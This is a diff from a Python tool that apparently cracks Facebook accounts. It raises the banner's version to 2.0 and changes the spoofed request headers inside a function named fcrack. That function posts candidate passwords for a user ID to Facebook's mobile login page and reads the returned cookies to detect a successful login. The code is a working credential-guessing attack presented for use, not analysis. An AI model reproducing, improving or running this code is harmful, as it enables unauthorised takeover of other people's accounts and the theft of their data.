@@ -174,7 +174,7 @@ Y88b. .d88P 888   Y8888 Y88b. .d88P
  "Y88888P"  888    Y888  "Y88888P"                            
 \033[1;37m══════════════════════════════════════════════════    
 \033[1;37m[•]  OWNER : UNO
-\033[1;37m[•]  VERSION : [1.3]
+\033[1;37m[•]  VERSION : [2.0]
 \033[1;37m══════════════════════════════════════════════════""")    
 def linex():
 	print('\033[1;37m══════════════════════════════════════════════════')    
@@ -404,7 +404,7 @@ def fcrack(uid,pwx,tl):
 			"pass":ps,
 			"login":"Log In"}
 			headers = {
-    'authority': 'free.facebook.com',
+    'authority': 'mbasic.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9,uz-UZ;q=0.8,uz;q=0.7,fil-PH;q=0.6,fil;q=0.5',
     'cache-control': 'max-age=0',
@@ -424,6 +424,7 @@ def fcrack(uid,pwx,tl):
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
     'viewport-width': '980',
 }
+
 			lo = session.post( 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
